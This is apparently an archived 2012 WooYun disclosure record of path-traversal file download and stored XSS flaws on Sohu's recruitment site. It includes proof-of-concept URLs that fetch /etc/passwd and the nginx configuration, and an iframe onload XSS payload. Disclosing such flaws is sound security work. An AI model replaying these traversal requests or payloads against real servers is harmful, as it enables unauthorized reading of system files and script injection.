{"id": 16507, "wybug_id": "wooyun-2012-012522", "wybug_title": "搜狐求职中心任意文件下载和xss漏洞", "wybug_corp": "搜狐", "wybug_author": "心伤的胖子", "wybug_date": "2012-09-21 16:31", "wybug_open_date": "2012-11-05 16:32", "wybug_type": "任意文件遍历/下载", "wybug_level": "中", "wybug_rank_0": "15", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2012-09-21：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2012-09-24：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2012-10-04：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2012-10-14：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2012-10-24：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2012-11-05：\t细节向公众公开  简要描述： 搜狐求职中心某处存在任意文件下载漏洞和存储型xss漏洞 详细说明：  1、任意文件下载漏洞在个人简历的添加附件处，上传附件后的附件下载地址为http://hr.sohu.com/backend.php/interface/getdoc/?path=file/src/2012-09-21/xxx.doc&name=xxx.docx后端程序没有对path进行校验，造成可以下载服务器上的任意文件（在权限允许的范围内）。2、存储型XSS漏洞编辑粘贴简历功能处，用的编辑器，但是对很多可以触发xss漏洞的标签等没有做处理，可以触发xss漏洞。   漏洞证明：  1、任意文件下载漏洞下载/etc/passwd，通过下面的URL：http://hr.sohu.com/backend.php/interface/getdoc/?path=../../../../etc/passwd&name=passwd.txt下载nginx的配置文件，通过下面的URL：http://hr.sohu.com/backend.php/interface/getdoc/?path=../../../../usr/local/nginx/conf/nginx.conf&name=nginx.conf还可以下载WEB目录内的文件。\n\n2、存储型XSS漏洞在编辑器中选择源代码，然后输入</textarea><iframe/onload=alert(1)><textarea>通过下面的URL可以触发xss漏洞，不过该漏洞貌似仅对自己有效，不知道后台编辑会不会出现该问题。http://hr.sohu.com/resume/addpaste?rid=467486&lid=1&uid=434627&talentTypeId=20&id=467486&op=add&jid=0   修复方案：  总结一下，所有输入输出都是有害的，需要进行严格的校验和过滤。   版权声明：转载请注明来源 心伤的胖子@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2012-09-24 09:57 厂商回复：  最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2012-09-21 17:58 |    \t\t心伤的胖子 \t\t\t( 普通白帽子  |\t\t\t        Rank:308 漏洞数:29        | 因为心伤，所以胖子。)\t\t \n  是谁补的图？靠谱呀！    \n     2012-11-07 09:35 |    \t\t凤凰 \t\t\t( 路人 |\t\t\t        Rank:15 漏洞数:6        | 涅磐)\t\t \n  @心伤的胖子 肯定是管理呗@xsser    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 10, "Ranks": null}